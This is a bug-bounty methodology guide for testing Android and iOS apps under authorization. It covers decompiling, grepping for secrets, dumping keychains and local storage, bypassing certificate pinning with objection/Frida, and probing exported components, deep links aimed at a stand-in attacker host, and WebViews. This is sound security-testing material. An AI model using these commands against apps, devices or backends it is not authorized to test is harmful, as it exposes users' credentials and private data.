---
technology: Mobile application testing (Android + iOS)
kind: bug-bounty-methodology
audience: ai-agent
family: mobile
version: "1.0"
last-refresh: "2026-11-19"
status: upstream-only
provenance: "upstream-only methodology authored for the mobile unit wave; the engagement pipeline is synthesized from the companion overviews [[mobile]]/[[mobile-android]]/[[mobile-ios]] and from OWASP MASTG, with every command verified against current tool documentation (objection, frida-ios-dump, mitmproxy, jadx, apktool) and platform docs (developer.android.com app-links/WebView, Apple Security framework) during the 2026-11-19 research pass. Zero corpus evidence by design."
source: "OWASP MASTG/MASVS; developer.android.com (app-links, WebView risk, manifest); docs.mitmproxy.org; objection and frida-ios-dump project docs — consulted 2026-11-19"
---

Companion pages: [[mobile]] (area router — lanes and dispatch), [[mobile-android]] (APK/device surface in depth), [[mobile-ios]] (IPA/keychain surface in depth). Tool notes live in the separate tools vault (Vaults/tools); this page references tools by name.

---

# Mobile application testing — bug bounty methodology

**Scope:** a handed-over mobile app (APK or IPA) plus the API behind it, under an authorized program. This is the *app-analysis lane* of [[mobile]] — a code-review engagement with a phone attached, not a device-on-engage network job. Both platforms covered; the pipeline is the same shape, the tooling diverges below the interception layer.

**Audience:** bug bounty hunters and red teamers with written permission. Every technique here is single-request, low-volume, evidence-first. You are decompiling and instrumenting *the authorized target app on a device you own or were issued* — that framing is what keeps pinning bypass, gadget injection, and keychain dumping inside the rules of engagement. Do not pull other users' data beyond the minimum a PoC needs; clean up test accounts and re-signed builds.

The organizing idea: **the app ships its own attack surface to you.** The manifest/Info.plist is a cleartext confession of exported components, deep-link schemes, and transport posture; the binary carries the secrets; the device carries the loot. Static analysis comes *first* and answers most of Phase 1 before you ever intercept a packet.

## Where the money is (triage priority)

| Priority | Class | Where it lives | Typical severity |
|---|---|---|---|
| 1 | Broken object-level authz (IDOR) on the API | Replay the app's own requests with other object IDs | High–Critical |
| 2 | Hardcoded secrets with live blast radius | API/cloud keys, FCM server key, signing secrets in the binary | High–Critical |
| 3 | Exported-component / IPC abuse | Activities, services, receivers, providers, custom-scheme deep links | High |
| 4 | Insecure local storage of credentials | `shared_prefs`, SQLite, plists, NSUserDefaults, weak-accessible keychain | Medium–High |
| 5 | WebView misconfig → local-file theft / XSS→native | JS bridge + file access + untrusted content | Medium–High |
| 6 | Transport weakness | No/weak pinning, cleartext permitted, ATS exceptions, intercepted auth | Medium–High |
| 7 | Deep-link open redirect / parameter injection | Unvalidated `scheme://host/path?param` reaching a sink | Medium |
| 8 | Firebase / backend misconfig reachable from the app | World-readable RTDB, open storage bucket, over-broad rules | Medium–High |
| 9 | Weak crypto / predictable randomness | MD5, static IV/key, `java.util.Random` for tokens | Low–Medium |
| 10 | Info disclosure via logs | Tokens/PII in logcat / idevicesyslog | Low |

Phases 0–2 build the map and harvest secrets statically; Phase 3 loots the device; Phases 4–6 are dynamic (intercept, IPC, WebView); the API work (Priority 1) runs *through* Phase 4's intercept and is usually the biggest payout. Work them in order on a fresh target.

---

## Phase 0 — Intake and the platform gate

Two decisions before any tool runs.

**Which platform, and what artifact do I have?** Android gives you an APK (often split into several `.apk` files) you can decompile directly. iOS gives you an IPA that, if pulled from the App Store, is **FairPlay-encrypted** — static analysis reads ciphertext until you obtain a decrypted image from a device.

**Jailed vs. jailbroken / rooted — the device-access decision.** This gates how much of the methodology is reachable:

| Device state | What you get | What you lose |
|---|---|---|
| **Android rooted** / **iOS jailbroken** | Full filesystem, system-store CA push, `frida-server`, keychain dump, private-data read | Nothing — this is the easy rung |
| **Android non-root** | `run-as` only if `debuggable`; external storage; patched-APK gadget; user-CA + NSC patch | System CA, arbitrary private-data read |
| **iOS non-jailbroken** | Patched-IPA re-sign + gadget; sideload with a dev identity | Memory dump, keychain-dumper, free filesystem |

The honest planning fact for iOS: recent flagship hardware on current iOS often has **no public jailbreak**, which is *why* the patched-IPA/re-sign lane exists. Decide the rung now — a jailbroken/rooted device makes everything below it trivial; its absence makes the artifact-patching lane mandatory. Android `targetSdkVersion` matters too: the platform refuses to install apps built against long-dead target SDKs, so legacy-dropper tricks relying on ancient targets fail on modern handsets.

```bash
# Android: 10-second fingerprint — package, version, targetSdk
aapt dump badging app.apk | grep -E "package|targetSdk"

# iOS: is this image still encrypted? cryptid 1 = stop, fix acquisition first
otool -l App | grep -A4 LC_ENCRYPTION_INFO     # cryptid 1 → encrypted
```

---

## Phase 1 — Static analysis first (unpack, decompile, read the manifest)

Goal: turn the artifact into a map of components, entry points, and transport posture *before* touching the network.

### 1.1 Unpack and decompile

```bash
# Android: split paths, pull, decompile, decode resources
adb shell pm path com.example.app                 # lists base + split APKs
adb pull <each-split-path> .
jadx -d out/ --deobf app.apk                       # DEX → readable Java/Kotlin
apktool d app.apk -o apktool_out/                  # manifest + resources to XML/smali

# iOS: acquire + decrypt (jailbroken device) then unzip
#   ipatool downloads the (still-encrypted) store package;
#   frida-ios-dump pulls the DECRYPTED image from a running app on a JB phone.
unzip -q app.ipa -d ipa_out/                       # Payload/App.app/{binary,Info.plist,...}
```

jadx answers "what does the code do"; apktool answers "what exactly does the manifest/resource tree say". Note the maintenance trap: the original `frida-ios-dump` is reported broken on Frida 17+ — align `frida-server` and host Frida major versions, or use a current fork. MobSF ingests both APK and IPA and produces the same triage class (secrets, storage, transport) — treat its output as a map, not a verdict. Verify a dump worked by confirming `cryptid 0` on the extracted binary.

### 1.2 Read the manifest (Android) — the published attack surface

Over the `apktool_out/AndroidManifest.xml`, triage five markers:

| Marker | Why it matters |
|---|---|
| `android:exported="true"` + `<intent-filter>` | Component callable by any app on the device → Phase 5 |
| `android:allowBackup="true"` | `adb backup` extracts private data without root (on devices still honoring it) |
| `android:debuggable="true"` | Any shell user `run-as` the package and reads private storage |
| `android:usesCleartextTraffic="true"` / no `networkSecurityConfig` | Cleartext permitted → downgrade + interception room |
| custom permission without `protectionLevel="signature"` | Any app can hold the permission gating a "protected" component |

Export semantics (verified): a component with **no** intent filter defaults to `exported="false"`; the moment it declares an `<intent-filter>` the effective default is exported — and since the Android 12 target level, the package must state `android:exported` explicitly or it will not install. Every `<activity>`/`<service>`/`<receiver>`/`<provider>` carrying a filter is in scope.

```bash
# Enumerate exported components and the deep-link schemes they claim
grep -nE 'android:exported="true"|<data android:scheme|android:host=' apktool_out/AndroidManifest.xml
```

### 1.3 Read `Info.plist` (iOS) — the manifest-equivalent confession

On the decrypted `Payload/App.app/Info.plist`:

- `NSAppTransportSecurity` → `NSAllowsArbitraryLoads` = cleartext invited (transport finding).
- `CFBundleURLTypes` → `CFBundleURLSchemes` = your custom-scheme deep-link surface → Phase 5.
- `UIBackgroundModes` = what the app may do unseen.
- `PrivacyInfo.xcprivacy` (current releases) = the developer's own declaration of fingerprinting-relevant/required-reason API use — recon data, written for you.

```bash
plutil -p Payload/App.app/Info.plist | grep -A3 -E 'URLSchemes|NSAllowsArbitraryLoads|UIBackgroundModes'
otool -hv Payload/App.app/App | grep PIE          # PIE missing = hardening finding
otool -Iv Payload/App.app/App | grep stack_chk    # stack canaries linked?
```

**Deliverable from Phase 1:** a table of *entry points* (exported components, deep-link schemes, URL schemes) and *transport posture* (cleartext allowed? pinning present?). That table drives Phases 4–6.

---

## Phase 2 — Secrets in the app binary

Goal: the app carries its own keys. Automated passes (apkleaks, MobSF) plus targeted greps over the decompiled tree.

```bash
# Endpoints and secret-shaped strings across the decompiled tree / resources
grep -EHirn 'api[_-]?key|secret|password|token|AKIA|BEGIN (RSA|EC) PRIVATE|firebaseio|amazonaws' out/ apktool_out/res/
grep -Phro '(https?://)[\w./-]+' out/ | sort -u | grep -v 'schemas.android\|w3.org'

# iOS: strings pass over the decrypted Mach-O before anything fancier
strings -a Payload/App.app/App | grep -iE 'api|key|secret|password|token|https?://'
```

Two patterns worth their own grep, because they have live blast radius the moment you find them:

- **Google API keys** `AIza[0-9A-Za-z_\-]{35}` and **FCM server keys** `AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}` — an FCM server key is push-notification control over the whole user base, not just a string. Validate scope conservatively (a single benign call), never spray.
- **Firebase-style config.** A `*.firebaseio.com` host or a bundled `google-services.json` / `GoogleService-Info.plist` points at backend config. Probe the real-time DB read permission with one request:

```bash
# A misconfigured RTDB answers with the whole database; one GET is the PoC.
curl -s 'https://<project>.firebaseio.com/.json' | head -c 400
```

Note the lazy-crypto variants that *look* protected but are not: base64 "encryption", XOR with a key in the same binary, a keystore that stores the key next to the lock. String-reference tracing finds them — `getString(R.string.label)` resolves through `strings.xml`, and the value is one grep away. Severity ranking for the report: a key that still authenticates to a live service is High+; a dead/test key is Info.

---

## Phase 3 — Local storage exposure (device loot)

Goal: what the app wrote to disk, and whether it survives "we deleted the app". Exercise the app first (log in, do the interesting actions), then sweep.

### 3.1 Android

```bash
# debuggable app: shell inside the app UID, copy its private DB/prefs out
adb exec-out run-as com.example.app cat shared_prefs/com.example.app_preferences.xml
adb exec-out run-as com.example.app cat databases/app.db > app.db   # inspect with sqlite3

# world-readable external copies (no root needed on typical configs)
adb shell ls -la /storage/emulated/0/Android/data/com.example.app/
```

High-yield: tokens/sessions in `shared_prefs` XML (routinely plaintext), unencrypted SQLite under `databases/`, cached API responses under `cache/`. The Android Keystore exists so keys live in hardware — code that fetches a Keystore key and then writes it to SharedPreferences "for convenience" has undone the design; that pattern is a reportable finding on its own.

### 3.2 iOS (jailbroken, or via objection on a patched build)

```bash
find /var/mobile/Containers/Data/Application/ \( -name "*.db" -o -name "*.sqlite" -o -name "*.plist" \)
```

High-yield: unencrypted SQLite (chat logs, API caches), plists / NSUserDefaults (`objection`'s `ios nsuserdefaults get` reads it in one shot), and **Snapshots** under `Library/SplashBoard/Snapshots/` — the OS screenshots the app on backgrounding, with whatever was on screen (tokens, balances). These survive casual deletion.

### 3.3 Keychain/Keystore accessibility audit

The structural finding is not "a secret is in the keychain" — it is *which accessibility class and access group* it uses.

```bash
objection -g com.example.app explore -s "ios keychain dump --json"   # from inside the running app
# keychain-dumper on a jailbroken phone dumps the whole reachable store
```

| `kSecAttrAccessible` value | Operator read |
|---|---|
| `WhenUnlocked` (+ `ThisDeviceOnly`) | Usable only when unlocked — the defensible choice |
| `AfterFirstUnlock` | Usable after first unlock until reboot — weaker, background-friendly |
| `Always` (legacy) | Readable by any code in the app, anytime — the "bad" grade |

An item written into a widely-shared **access group** (or with no effective group protection) is readable by every app in that group — third-party SDKs that share keychain groups across *different vendors'* apps turn "encrypted" into "shared with strangers". On Android, the mirror is a key placed in SharedPreferences instead of the hardware-backed Keystore, or a Keystore entry without `setUserAuthenticationRequired`.

---

## Phase 4 — Network-layer testing (intercept, bypass pinning, test the API)

Goal: see the app's traffic, then test the API behind it as an API.

### 4.1 Stand up the intercept

mitmproxy (or Burp Suite) between app and API. Flow: run the proxy on all interfaces, point the device's Wi-Fi proxy at it, install the CA, then watch flows.

```bash
mitmweb --listen-host 0.0.0.0 --listen-port 8080     # UI on http://127.0.0.1:8081
# On the device: set Wi-Fi proxy to <host>:8080, browse http://mitm.it, install the CA.
```

The recurring obstacle: apps targeting Android 7.0+ ignore **user-installed** CAs, so the proxy CA added as a "user certificate" is invisible to exactly the apps you care about. The matrix:

1. **User CA + network-security-config patch (non-root, artifact in hand).** Add a `<debug-overrides>` block trusting user certs to `network_security_config.xml`, repoint the manifest, rebuild with apktool, re-sign. Works on clean devices and inside app-store scope.
2. **System CA push (rooted).** Convert the DER cert to its OpenSSL subject-hash name (`<hash>.0`), drop into `/system/etc/security/cacerts/` (or via a Magisk cert module per the mitmproxy docs), chmod 644, reboot.
3. **iOS:** install the mitmproxy/Burp CA profile, then *explicitly enable full trust* for it (Settings → General → About → Certificate Trust Settings — iOS does not trust it on install).

### 4.2 Bypass certificate pinning (authorized app, your device)

Pinning survives CA trust: the app validates its own leaf/intermediate regardless of the store. Distinguish the two failure modes first — a clean connect failure is a *trust* problem (fix with the CA matrix above); a connect-then-reset on one host is *pinning*.

```bash
# Rooted/JB: frida-server running on device, then objection's broad unpinning hook
objection -g com.example.app explore --startup-command "android sslpinning disable"
objection -g com.example.app explore --startup-command "ios sslpinning disable"

# Clean device: patch the artifact to embed a Frida gadget, install, attach
objection patchapk --source app.apk            # Android: inject gadget, re-sign
objection patchipa --source app.ipa --codesign-signature "Apple Development: you@example.com"
```

`android sslpinning disable` hooks the common implementations (TrustManager, OkHttp/Retrofit, HttpsURLConnection); if it misses, a hand-written Frida hook on the app's `checkServerTrusted` / `URLSession:didReceiveChallenge:` is the fallback. Framework apps relocate the check: **Flutter** bundles BoringSSL and validates certs itself (ignoring the system store), so unpin by hooking the engine's session-verify function, not the trust path. Expect active anti-analysis in finance-class apps (root/jailbreak detection, Play Integrity attestation, Frida detection) — budget time; a server that *attests* device integrity is a harder problem than a client that merely checks for `su`/Cydia.

### 4.3 Test the API as an API (the biggest payout)

Once traffic is readable, the mobile backend is a web API — and the app binary is an *oracle* for it: endpoints, parameters, and feature flags discovered in decompiled code frequently reveal admin/test routes the UI never shows. Replay captured requests and test:

- **Object-level authz (IDOR).** Two accounts; replay a request with the other account's object ID. A 200 with B's data on A's token is the Priority-1 finding. ID format is irrelevant — UUIDs stop enumeration, not a two-account swap.
- **Authentication design.** API-key-only schemes with no user binding; JWT handling (`alg:none`, weak HMAC secret, unchecked `exp`/`aud`); refresh rotation that never invalidates the old token.
- **Mass assignment.** Client JSON fields (`role`, `is_admin`, `tenant_id`) that map straight onto server models.
- **Rate limiting** on auth/OTP endpoints (a handful of requests, never a flood).

Any single-host program typically scopes the API domain (`api.example.com`) alongside the app — keep requests low-volume and evidence-tight.

---

## Phase 5 — IPC and deep-link abuse (entry points as attack surface)

Goal: the entry points from Phase 1 are callable by *other apps* (or by you). Each is an unauthenticated front door into the app's privileges.

### 5.1 Android exported components

```bash
# Launch an exported activity with attacker-chosen extras
adb shell am start -n com.example.app/.SecretActivity --es token "attacker"

# Fire a deep link exactly as a malicious page/app would (VIEW + BROWSABLE)
adb shell am start -W -a android.intent.action.VIEW \
  -c android.intent.category.BROWSABLE -d "exampleapp://webview?url=https://attacker.example.com"

# Query an exported content provider; probe SQLi at selection/path traversal at openFile
adb shell content query --uri content://com.example.app.provider/users
```

The high-value classes: an exported **activity** that forwards a received intent into a protected action (intent-proxy / privilege re-delegation); an exported **service** that takes file paths/URLs/commands verbatim from the intent; an exported **receiver** that acts on broadcast extras (fetch a URL, write a file, flip a setting); a **content provider** with SQL injection at its `selection`/`sortOrder` boundary or path traversal in a FileProvider `openFile()`. drozer automates provider/activity/service enumeration and these probes; a two-activity PoC harness proves the service/receiver cases.

### 5.2 Deep-link classes (both platforms)

A custom `scheme://` handler reproduces web bug classes inside the app. For Android **App Links** (`android:autoVerify="true"` + a server `assetlinks.json` at `https://example.com/.well-known/assetlinks.json`), verify the association actually resolves — a missing or wrong `assetlinks.json` means the "verified" link falls back to a chooser, and a lookalike app can claim the scheme.

```bash
# Android 17+: show which apps/rules a URL resolves to
adb shell am start --debug-link -a android.intent.action.VIEW -d "https://example.com/pay?to=..."
```

iOS custom schemes are invoked from Safari's address bar or a Frida one-liner on `UIApplication.openURL`. The bug classes to chase through either platform's link parameters: **open redirect** (unvalidated host handed to a browser/WebView), **parameter injection** when a value reaches a sink (SQL, file path, a WebView `loadUrl`), and **local-file read** when a parameter names a file. The deep link is attacker-controlled input from the moment another app can send it.

---

## Phase 6 — WebView misconfiguration

Goal: a WebView that loads untrusted content *and* exposes native capability or local files is a bridge between a web bug and the device.

Three settings compound into findings — grep the decompiled code for them:

```bash
grep -nE 'addJavascriptInterface|setJavaScriptEnabled|setAllowFileAccess|setAllowUniversalAccessFromFileURLs|setAllowFileAccessFromFileURLs|loadUrl' out/
```

- **JS→native bridge.** `addJavascriptInterface(obj, "name")` exposes every `@JavascriptInterface`-annotated method to *every page loaded in that WebView*. If the app also loads attacker-influenceable content (a deep-link `url=` parameter, an in-app browser, user HTML), JavaScript reaches Java. Reproduce with `appscheme://webview?url=https://attacker.example.com/` serving `name.someMethod(...)`.
- **File access.** `setAllowUniversalAccessFromFileURLs(true)` / `setAllowFileAccessFromFileURLs(true)` let JavaScript on a `file://` page read any origin and the local filesystem — the classic `file://`-XSS → steal `/data/data/<pkg>/` primitive. These default **true through API 29** and **false from API 30+**, so apps with a low `targetSdk` (Phase 0) or that set them explicitly are the targets. A WebView that enables these *and* loads untrusted content is the reportable combination.
- **Loading over cleartext / no cert check.** A WebView that loads `http://` content, or overrides `onReceivedSslError` to `proceed()`, is a MitM injection point for everything above.

iOS `WKWebView` is safer by default (no synchronous Java bridge, no file access to arbitrary origins) but message handlers (`WKScriptMessageHandler`) and `WKWebView` instances loading mixed/untrusted content carry the equivalent risk — enumerate them the same way.

---

## Reporting and evidence standards

The report is the product. Structure every finding the same way:

1. **Title — impact first.** "User A reads and modifies any user's order via `GET/PATCH /orders/{id}` (IDOR)" beats "IDOR found". For a static finding, name the concrete blast radius: "Live FCM server key in `strings.xml` grants push to all users".
2. **Preconditions.** State the device rung honestly: "non-root device, app installed from the store" is stronger than "rooted device" because it is closer to a real attacker. If a finding needs root/jailbreak to *demonstrate* but not to *exploit* (e.g. the data is also in a world-readable external path), say so.
3. **PoC.** Copy-pasteable `adb`/`curl`/`objection` steps, one action per step, expected vs. actual. For IPC, include the two-activity harness or the exact `am start`.
4. **Evidence.** Decompiled snippet with file+line, the request/response pair, the keychain/prefs dump — redacted. Never exfiltrate more than the proof needs; clean up test accounts and remove re-signed/patched builds.
5. **Remediation.** One paragraph, platform-specific: pin to the correct accessibility class, move the key to Keystore/Keychain with auth-required, mark the component `exported="false"`, allowlist the deep-link host, disable the file-access WebView flags, enforce server-side object ownership.

Evidence that travels well: a decompiled constant *plus* the live request it unlocks (secret → impact chain); a before/after of a modified object (IDOR write); a screen recording of the deep-link PoC firing from a second app. Map findings to **OWASP MASVS** domains when the program expects categories — STORAGE (Phase 3), CRYPTO (weak primitives), AUTH (Phase 4.3), NETWORK (Phase 4.1–4.2), PLATFORM (Phases 5–6), RESILIENCE (the anti-analysis arms race) — but the categories are a reporting language, not a different method.

### Coverage closeout

| Claim you tried to prove | Rejected (secure) if |
|---|---|
| A secret in the binary still authenticates to a live service | every extracted key is dead/test-scoped (Phase 2) |
| Another user's object is reachable by ID | every cross-account replay is blocked server-side (4.3) |
| An exported component performs a privileged action for any caller | every exported component validates caller/extras (Phase 5) |
| Credentials persist in readable local storage | prefs/DB/keychain hold no plaintext secrets at weak accessibility (Phase 3) |
| A WebView bridges untrusted content to native/local files | no WebView combines a JS bridge/file access with untrusted content (Phase 6) |
| Traffic is interceptable / downgradable | pinning holds and cleartext is refused on every host (Phase 4) |

---

## CTF notes

Mobile CTF challenges compress this pipeline into "find the flag in the app":

- **The flag is usually static.** Most mobile challenges hide the flag in the binary or resources — go straight to Phase 2. `jadx -d out/ chall.apk` then `grep -rn flag out/`; for iOS, `strings` the decrypted Mach-O. Flags are often base64'd, XOR'd, or assembled at runtime from split constants — trace the string references in jadx.
- **Reconstruct, don't just grep.** Many challenges compute the flag in a validation routine (`checkFlag(input)`); read the logic in jadx and invert it, or hook the check with Frida to print the expected value (`frida -U -f com.example.app -l dump.js`) rather than reversing the math.
- **Hidden entry points.** Exported activities/receivers that reveal the flag when launched with the right extras — enumerate with the Phase 5 `am start` probes. Deep-link challenges want the exact `scheme://host/path?param`.
- **Frida/objection are the universal solvers.** `objection explore` for quick `ios keychain dump` / `android hooking` tasks; raw Frida for bespoke hooks (return-value spoofing to pass a root/jailbreak check, dumping decrypted buffers, calling an internal method directly). Native-library challenges (`lib/<abi>/*.so`) drop you into radare2/Ghidra on the `.so`.
- **Flutter/RN challenges** relocate logic: Flutter flags live in `libapp.so` (parse with blutter), React Native flags in `assets/index.android.bundle` (readable JS unless Hermes bytecode — disassemble with hermes-dec).

---

## References

- OWASP MASTG / MASVS — https://mas.owasp.org/MASTG/
- OWASP MASTG, WebView JavaScript bridge knowledge — https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/
- developer.android.com — WebView unsafe file inclusion risk (file-URL settings default by API level) — https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion
- developer.android.com — Test Android App Links (`am start --debug-link`, `am start -a VIEW -c BROWSABLE -d`) — https://developer.android.com/training/app-links/test-applinks
- developer.android.com — Verify Android App Links / `assetlinks.json` troubleshooting — https://developer.android.com/training/app-links/troubleshoot
- Apple — Security framework, keychain item accessibility (`kSecAttrAccessible`) — https://developer.apple.com/documentation/security/ksecattraccessible
- mitmproxy — install system-trusted CA on Android (Magisk module) — https://docs.mitmproxy.org/stable/howto-install-system-trusted-ca-android/
- objection — runtime mobile exploration (`android/ios sslpinning disable`, `patchapk`, `patchipa`, `ios keychain dump`) — https://github.com/sensepost/objection
- Frida — dynamic instrumentation toolkit — https://frida.re/docs/home/
- frida-ios-dump — decrypt an iOS app from a jailbroken device — https://github.com/AloneMonkey/frida-ios-dump
- jadx — DEX to Java decompiler — https://github.com/skylot/jadx
- Apktool — resource/manifest decoding and rebuild — https://apktool.org/
- MobSF — static+dynamic analysis for APK/IPA — https://github.com/MobSF/Mobile-Security-Framework-MobSF
- Keychain-Dumper — iOS keychain extraction (jailbroken) — https://github.com/ptoomey3/Keychain-Dumper

*Authored 2026-11-19 from OWASP MASTG/MASVS, developer.android.com (app-links, WebView risk, manifest export semantics), Apple Security framework docs, and the objection / frida-ios-dump / mitmproxy / jadx / apktool project documentation; every command verified against current tool docs during the research pass. Companion overviews: [[mobile]], [[mobile-android]], [[mobile-ios]]. Model claude-opus-4-8.*
